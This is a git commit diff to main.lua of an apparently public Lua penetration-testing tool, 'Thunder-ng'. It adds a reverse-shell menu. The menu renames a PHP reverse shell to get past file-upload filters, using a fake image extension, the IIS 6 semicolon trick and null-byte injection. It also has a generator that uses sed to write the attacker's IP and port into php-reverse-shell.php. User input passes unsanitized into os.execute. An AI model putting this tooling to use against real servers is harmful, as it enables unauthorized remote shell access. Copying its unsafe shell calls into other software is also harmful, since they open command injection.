0a7db1efae6c1f393df08f5d6d1a739393c4b793
BugAlpha <bugalpha@protonmail.com>
2022-03-17 21:48:17 +0100

    Added A reverse shell menu !

--- main.lua
+++ main.lua
@@ -1,3 +1,30 @@
+--[[
+
+MIT License
+
+Copyright (c) 2022 BugAlpha
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+
+]]
+
 print("Welcome To Thunder-ng")
 -- Show the help menu if arg[2] is -h
 function help()
@@ -37,7 +64,7 @@ function hidden_content_hunt()
 	then
 		io.write("Please give an ip address : ")
 		local ip = io.read()
-		io.write = ("Do you have a wordlist? give me the path or hit y to use default : ")
+		io.write("Do you have a wordlist? give me the path or hit y to use default : ")
 		local i = io.read()
 		if ( i == "y" or i == "Y" )
 		then
@@ -66,6 +93,59 @@ function hidden_content_hunt()
 		print("[*] Saved to results/umbraco_" .. os.date("%m.%d.%Y") .. ".txt")
 	end
 end
+function reverse_shell()
+	if ( arg[1] == "-rv" and arg[2] == "--bypass" )
+	then
+		print("Select what you want to byass file upload on")
+		print("1-PHP")
+		io.write("->: ")
+		local i = io.read()
+		if ( i == "1" ) 
+		then
+			print("Please The path to you reverse shell")
+			io.write("->: ")
+			local reverse_shell_path = io.read()
+			print("Select which Method you want to use : ")
+			print("1-Change File extension To an image")
+			print("2-IIS 6 semi-colon bypass")
+			print("3-null character injection")
+			print("4-Change Exif data (Soon)")
+			io.write("->: ")
+			local i = io.read()
+			if ( i == "1" )
+			then
+				os.execute("mv " .. reverse_shell_path .. " results/" .. reverse_shell_path .. ".jpg")
+				print("[*] Payload was saved to results/" .. reverse_shell_path .. ".jpg")
+			end
+			if ( i == "2" )
+			then
+				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" ..reverse_shell_path .. "'" .. "';.jpg'")
+				print("[*] Payload was saved to results/" .. reverse_shell_path .. "';.jpg'")
+			end
+			if ( i == "3" )
+			then
+				os.execute("mv " .. reverse_shell_path .. " results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'" )
+				print("[*] Payload was saved to results/" .. "'" .. reverse_shell_path .. "'" .. "'%00.jpg'")
+			end
+		end
+	end	
+	if ( arg[1] == "-rv" and arg[2] == "--generator" )
+	then
+		print("Please give your ip address (If your attack is local give your local address else give your public ip)")
+		io.write("->: ")
+		ip   = io.read()
+		print("Please provide a port number")
+		io.write("->: ")
+		port = io.read()
+		print("What you name you want to give to the reverse shell (Make sure you add .php at the end)")
+		io.write("->: ")
+		path = io.read()
+		os.execute("sed -i \'49s/.*/$ip = " .. "'" .. ip .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && " .. " sed -i \'50s/.*/$port = " .. "'" .. port .. "'" .. ";/\' reverse_shells/php-reverse-shell.php && cat reverse_shells/php-reverse-shell.php > " .. path)
+		print("[:)] Done!")
+		print("[*] Saved to " .. path )
+	end
+end
 help()
 exploits_searcher()
 hidden_content_hunt()
+reverse_shell()
